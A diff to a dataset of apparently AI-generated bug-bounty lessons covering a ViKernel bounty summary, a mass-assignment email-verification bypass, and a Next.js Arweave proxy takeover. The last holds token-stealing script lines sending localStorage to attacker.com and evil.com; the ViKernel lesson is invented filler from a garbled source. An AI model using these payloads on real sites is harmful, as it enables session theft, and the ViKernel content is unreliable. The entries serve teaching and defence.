@@ -100,16 +100,16 @@
     "categories": [
       "other"
     ],
-    "severity": null,
+    "severity": "high",
     "difficulty": null,
-    "summary_en": "A public bug bounty program for VIDRAFT's ViKernel AI security kernel resulted in 148 vulnerabilities discovered across four seasons of testing.",
+    "summary_en": "VIDRAFT's ViKernel AI security kernel concluded a four-season bug bounty program, resulting in 148 vulnerabilities discovered through 298 attack attempts.",
     "summary_ar": null,
     "lesson": {
-      "cause": null,
-      "walkthrough": null,
-      "example": null,
-      "takeaway": null,
-      "fix": null,
+      "cause": "The specific technical root causes are not detailed in the source due to corrupted data, but the vulnerabilities exist within ViKernel, an AI-based security kernel (the core part of an operating system that manages hardware and software). The high volume of findings (148 vulnerabilities) across 298 attacks suggests that the kernel's logic for handling adversarial inputs or system calls contained significant flaws. These flaws were identified during a structured 'open-attack' program designed to stress-test the AI's security boundaries.",
+      "walkthrough": "The source material does not provide specific technical steps or exploit code for the 148 vulnerabilities found. It only reports the high-level results of the bug bounty program.\n\nPROGRAM OVERVIEW\n1. A public bug bounty program (a contest where hackers are paid to find flaws) was launched for ViKernel.\n2. The program was organized into four distinct 'seasons' to allow for iterative testing and patching.\n3. Security researchers performed 298 total attacks (attempts to bypass security or crash the system) against the AI kernel.\n4. These efforts successfully identified 148 unique vulnerabilities (weaknesses in the software).\n5. The program concluded with a total prize distribution of $4,500 to the participating researchers.",
+      "example": "Since no specific bug was detailed, we can imagine a common vulnerability in an AI security kernel. Suppose the kernel uses an AI model to decide if a file is malicious. A researcher finds that by adding a specific sequence of 'junk' data to the end of a virus, the AI is tricked into thinking the file is safe. \n\nAttack Request:\n[Malicious File Content] + [0x00 * 1024] \n\nWhy it works: The kernel's AI model has a 'blind spot' for files of a certain size or padding. By appending 1024 null bytes (empty data), the researcher bypasses the security check, allowing the virus to run. This is a logic flaw in the AI's decision-making process.",
+      "takeaway": "When a program has multiple 'seasons,' it is a signal to researchers that the attack surface is evolving and that the developers are actively fixing previous bugs. In AI security kernels, look for 'adversarial examples'—inputs specifically designed to confuse machine learning models. A common mistake is assuming that AI-driven security is inherently more robust than traditional rule-based security; often, the AI introduces new, complex failure modes. Researchers should focus on the interface where the AI kernel receives data from the rest of the operating system.",
+      "fix": "Without specific vulnerability details, general fixes for a security kernel include implementing strict input validation (checking that data follows expected rules) and memory protection. Developers should use 'fuzzing' (sending massive amounts of random data) to find crash points before attackers do. Additionally, the AI models should be trained on adversarial datasets to recognize attempts to bypass their logic.\n\nExample of a generic input check:\nif (input_size > MAX_LIMIT || contains_illegal_chars(input)) {\n    reject_request();\n}",
       "cause_ar": null,
       "walkthrough_ar": null,
       "example_ar": null,
@@ -119,7 +119,7 @@
     "excerpt": "The Korean body text of the source you provided appears to be **garbled/corrupted encoding** (`����-404 ��ҳ�ܶ���`), which typically indicates a 404-not-found page rendered in a broken character set — meaning the actual article body **did not load or does not exist** at that URL. The only usable content I have is the **headline**, which contains these verifiable claims: * 298 attacks, 148 vulnerabilities * A product called **ViKernel** (an AI security kernel by VIDRAFT) * A public bug-bounty / open-attack program across **4 seasons** * Total prize pool of **$4,500** **I cannot write a 600–900 w",
     "ai_generated": true,
     "engagement": null,
-    "score": 40
+    "score": 53
   },
   {
     "id": "d848812a224c",
@@ -182,26 +182,26 @@
     "categories": [
       "mass-assignment"
     ],
-    "severity": null,
-    "difficulty": null,
-    "summary_en": "A mass‑assignment flaw lets an attacker change the email‑verified flag from false to true, bypassing email verification.",
+    "severity": "medium",
+    "difficulty": "beginner",
+    "summary_en": "An attacker bypassed the mandatory email verification process by sending a PATCH request that manually updated their account's verification status flag to 'true'.",
     "summary_ar": null,
     "lesson": {
-      "cause": null,
-      "walkthrough": null,
-      "example": null,
-      "takeaway": null,
-      "fix": null,
+      "cause": "The root cause was a Mass Assignment vulnerability in the profile update API. Mass Assignment occurs when an application takes user-provided data and automatically saves it to a database record without filtering which fields are allowed to be changed. In this case, the endpoint at /mobify/proxy/api/customer/.../customers/{customerId} accepted the 'c_isCustomerVerified' field from the user's request. Because the server did not use an allowlist (a list of safe fields like 'name' or 'address'), it allowed the user to overwrite a sensitive internal status flag that should only be controlled by the system.",
+      "walkthrough": "RECON\n1. The researcher created a new account on redacted.com using a temporary email address.\n2. Upon logging in, the site displayed a verification wall, blocking access to profile editing and order tracking until the email link was clicked.\n\nDISCOVERY\n3. The researcher used Burp Suite (a tool that intercepts and inspects web traffic) to monitor the background communication between the browser and the server.\n4. They identified a GET request (a request to fetch data) used to load the user's profile details.\nGET /mobify/proxy/api/customer/.../customers/{customerId}?siteId=redacted HTTP/1.1\nWhy: This endpoint (a specific web address for an API) returns the current state of the user's account in the database.\n5. The researcher examined the JSON response (a text-based data format used by APIs) and found a specific flag (a true/false indicator).\n{\n \"customerId\": \"12345\",\n \"email\": \"testuser@example.com\",\n \"c_isCustomerVerified\": \"false\"\n}\nWhy: The 'c_isCustomerVerified' label with the value 'false' tells the website that this user has not yet clicked the email link.\n\nEXPLOITATION\n6. The researcher sent the request to Burp Repeater (a tool for modifying and re-sending requests) and changed the method from GET to PATCH.\nPATCH /mobify/proxy/api/customer/shopper-customers/v1/organizations/redacted_org/customers/{customerId}?siteId=redacted\nWhy: A PATCH request is used to update existing information on a server.\n7. The researcher added a JSON payload (the data sent in the body of the request) to the PATCH request, manually setting the verification flag to true.\n{\n \"c_isCustomerVerified\": \"true\"\n}\nWhy: The researcher is testing if the server blindly accepts this instruction to change its internal record of the user's status.\n8. The server responded with a '200 OK' status code, indicating the update was successful.\n\nIMPACT\n9. To confirm the exploit, the researcher sent the original GET request again.\nGET /mobify/proxy/api/customer/.../customers/{customerId}?siteId=redacted\nWhy: To see if the server now reports the user as verified.\n10. The response confirmed the change: '\"c_isCustomerVerified\": \"true\"'.\n11. The researcher refreshed the browser, and the verification wall disappeared, granting full access to the account without ever opening an email inbox.",
+      "example": "Imagine a fictional site called 'target.example' where users can sign up for a free trial. When you view your profile, the site sends a request to 'GET /api/v1/me' and receives this JSON: {'username': 'newbie', 'is_premium_subscriber': false}. To test for Mass Assignment, an attacker would try to send a 'PUT' or 'PATCH' request to the same endpoint with a modified payload: {'is_premium_subscriber': true}. If the server is vulnerable, it will update the user's database record, granting them paid features for free because the developer forgot to tell the code: 'Only allow users to change their username, never their subscription status.'",
+      "takeaway": "When hunting for bugs, always inspect the JSON responses of profile or settings pages for interesting boolean (true/false) flags like 'isVerified', 'isAdmin', or 'can_access_beta'. If you find one, try to send that same flag back to the server using a PUT or PATCH request. A common beginner mistake is assuming that because a field isn't visible in a web form, it can't be changed; however, APIs often listen for more fields than the UI shows. Look for 'hidden' parameters in the documentation or by observing the traffic of different user roles.",
+      "fix": "The fix is to implement a strict allowlist for all user-facing update endpoints. Instead of mapping the entire incoming JSON object to the database, the code should explicitly extract only the fields the user is permitted to change. For example, in a Node.js/Express app, instead of 'User.update(req.body)', use 'User.update({ firstName: req.body.firstName, lastName: req.body.lastName })'. Sensitive fields like 'c_isCustomerVerified' should only be modified by internal logic triggered by a valid verification token link.\n\n```javascript\n// FIXED CODE EXAMPLE\napp.patch('/api/profile', (req, res) => {\n  const allowedUpdates = ['firstName', 'lastName', 'phoneNumber'];\n  const updates = {};\n  \n  // Only copy fields that are in the allowlist\n  allowedUpdates.forEach(field => {\n    if (req.body[field] !== undefined) {\n      updates[field] = req.body[field];\n    }\n  });\n\n  // This prevents 'c_isCustomerVerified' from being updated by the user\n  db.users.update({ id: req.user.id }, { $set: updates });\n  res.status(200).send('Profile updated');\n});\n```",
       "cause_ar": null,
       "walkthrough_ar": null,
       "example_ar": null,
       "takeaway_ar": null,
       "fix_ar": null
     },
-    "excerpt": null,
+    "excerpt": "When you sign up on most shopping websites, they ask you to click a link in your email before you can edit your profile or track orders. It’s a basic security check to prove the email actually belongs to you. Recently, while testing a bug bounty target (let’s call it **redacted.com**), I found a simple Mass Assignment bug that let me skip this check completely — without ever opening my inbox. Here is how I found it. ## Step 1: Getting Stuck on the Verification Screen > I started by creating a brand-new account on `redacted.com` using a temporary email address. As soon as I signed up, the site",
     "ai_generated": true,
     "engagement": null,
-    "score": 40
+    "score": 47
   },
   {
     "id": "a41649e6d7e0",
@@ -425,27 +425,27 @@
     "published_at": "2026-11-21T18:12:52.000Z",
     "added_at": "2026-11-22T10:00:57.605Z",
     "categories": [
-      "cache-smuggling",
-      "auth-bypass",
-      "access-control"
+      "xss",
+      "access-control",
+      "auth-bypass"
     ],
     "severity": "critical",
     "difficulty": "intermediate",
-    "summary_en": "A vulnerability in a Next.js CDN proxy configuration allowed for a one-click account takeover, likely through cache-related exploitation.",
+    "summary_en": "A Next.js rewrite rule proxied a permissionless storage network (Arweave) onto the main domain, allowing attackers to host malicious HTML that stole authentication tokens from localStorage. This resulted in a one-click account takeover that bypassed Content Security Policy (CSP) protections.",
     "summary_ar": null,
     "lesson": {
-      "cause": null,
-      "walkthrough": null,
-      "example": null,
-      "takeaway": null,
-      "fix": null,
+      "cause": "The root cause was an architectural flaw in the Next.js `rewrites()` configuration, which acted as a reverse proxy for Arweave. A reverse proxy (a server that sits in front of another and forwards requests) was configured to fetch content from Arweave and serve it under the application's own origin (the domain name and protocol). Because Arweave is permissionless (anyone can upload files), an attacker could host a malicious HTML file there. When the application served this file on its own domain, the browser treated the attacker's script as 'trusted' code, granting it full access to the user's localStorage data.",
+      "walkthrough": "RECON\n1. The researcher analyzed the open-source configuration file `next.config.ts` to find how the server routes traffic.\n2. They identified a `rewrites()` function that mapped internal paths to external URLs:\n`{ source: '/cdn/arweave/:path*', destination: 'https://arweave.net/:path*' }` \nWhy: This creates a reverse proxy (a middleman server) that makes external content appear as if it belongs to the target domain.\n\nDISCOVERY\n3. The researcher noted that Arweave is a permissionless storage network (a system where anyone can save files permanently).\n4. They tested the standard proxy path but found it redirected to a safe, isolated subdomain.\n5. They discovered the `/raw/` endpoint on Arweave, which serves files directly without redirection:\n`target.com/cdn/arweave/raw/{transaction_id}`\nWhy: The `/raw/` endpoint (a specific web address for data) bypasses security redirects, allowing HTML to render directly on the target's domain.\n\nEXPLOITATION\n6. The researcher checked the Content Security Policy (CSP) (a security layer that tells the browser which scripts are safe to run).\n7. The CSP allowed `script-src 'self' 'unsafe-inline'`, meaning scripts from the same domain or written directly in HTML would run.\n8. They confirmed the application stored sensitive session tokens in `localStorage` (a web storage area that JavaScript can read, unlike secure cookies).\n9. The researcher uploaded a malicious HTML file to Arweave containing a script to steal these tokens.\n\nPAYLOAD BREAKDOWN\n10. The payload used `localStorage.getItem('auth:token')` to grab the user's login key.\n11. To send the data to their own server, they used `window.location` (a command that changes the browser's current URL):\n`window.location = 'https://attacker.com/?d=' + btoa(JSON.stringify(tokens));` \nWhy: `btoa` (a function that turns data into a text string) encodes the tokens into the URL. This bypasses `connect-src` (a CSP rule that blocks background data transfers) because browsers must always allow the user to navigate to a new page.\n\nIMPACT\n12. The researcher clicked the link, and the script automatically sent their tokens to the attacker's server.\n13. They used the stolen tokens to impersonate the user by injecting them back into a fresh browser's `localStorage`:\n`localStorage.setItem('auth:token', stolen_jwt);` \nWhy: This tricks the website into thinking the attacker is the logged-in victim, granting full access to private data and account settings.",
+      "example": "Imagine a site `social.example` that allows you to view files from a public cloud via `social.example/view/:file_id`. The server is configured to fetch `https://public-cloud.com/:file_id` and show it to you. An attacker uploads a file named `steal.html` to the cloud. This file contains: `<script>location.href='https://evil.com/log?data='+localStorage.getItem('session');</script>`. The attacker sends a link to a victim: `https://social.example/view/steal.html`. When the victim clicks, their browser thinks `social.example` is running the script. The script reads the 'session' key from the browser's memory and sends it to `evil.com`. The attacker now has the victim's login key.",
+      "takeaway": "Always audit configuration files like `next.config.js` or `nginx.conf` for proxy rules. If your application proxies a service where users can upload content (like IPFS, Arweave, or S3), you are effectively allowing those users to run JavaScript on your domain. To prevent this, never store sensitive tokens in `localStorage`; use `HttpOnly` cookies (a setting that prevents JavaScript from seeing the cookie). Also, remember that CSP `connect-src` does not stop data theft via `window.location` redirects.",
+      "fix": "The most effective fix is to remove the proxy rewrite rule for untrusted storage networks. If you must proxy content, serve it from a completely different domain (e.g., `user-content.com`) so that it does not share an origin with your main site. Alternatively, use the `Content-Security-Policy: sandbox` header or render the content inside an `<iframe>` with the `sandbox` attribute to prevent scripts from accessing the parent page's data. \n\nExample of a safer rewrite (removing the proxy):\n`// In next.config.js, remove the vulnerable line:` \n`// { source: '/cdn/arweave/:path*', destination: 'https://arweave.net/:path*' }`",
       "cause_ar": null,
       "walkthrough_ar": null,
       "example_ar": null,
       "takeaway_ar": null,
       "fix_ar": null
     },
-    "excerpt": null,
+    "excerpt": "A Next.js rewrite rule proxied decentralized storage content through the target’s origin. Since the storage network is permissionless — anyone can upload HTML — an attacker could serve arbitrary JavaScript on the application’s domain, bypassing CSP, stealing auth tokens from localStorage, and achieving full account takeover. CVSS 9.3 Critical. ## Recon — Reading the Source I pulled the open-source repo and started reading next.config.ts. Most bug hunters skip config files — they’re chasing API endpoints and input fields. But config files are where architectural decisions live, and architectura",
     "ai_generated": true,
     "engagement": null,
     "score": 60
